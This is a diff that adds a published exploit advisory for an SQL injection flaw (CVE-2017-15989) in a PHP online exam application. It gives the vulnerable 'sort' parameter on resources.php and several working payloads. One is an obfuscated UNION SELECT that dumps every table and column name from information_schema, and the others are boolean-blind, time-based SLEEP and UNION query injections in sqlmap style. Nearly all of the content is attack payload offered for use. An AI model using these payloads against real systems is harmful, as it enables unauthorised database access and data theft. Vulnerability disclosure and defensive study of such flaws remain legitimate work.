@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: Online Exam Test Application - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.exclusivescript.com/product/1z2e4672468/php-scripts/online-exam-test-application
+# Demo: http://198.38.86.159/~onlineexamboard/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15989
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/resources.php?action=category&sort=[SQL]
+# 
+# -8++/*!07777UNION*/+/*!07777SELECT*/+0x31,0x32,0x496873616e2053656e63616e,(/*!07777Select*/+export_set(5,@:=0,(/*!07777select*/+count(*)/*!07777from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!07777table_name*/,0x3c6c693e,2),/*!07777column_name*/,0xa3a,2)),@,2))--+-
+# 
+# Parameter: sort (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: action=category&sort=8 AND 5525=5525
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: action=category&sort=8 AND SLEEP(5)
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 4 columns
+#     Payload: action=category&sort=8 UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,0x77654f6a51797a6c7755546b54574f68467842734c4268517654667a6e584e63634871574f4f454e,0x716b766a71),NULL-- Yhyw
+# 	
+# Etc..
+# # # # #
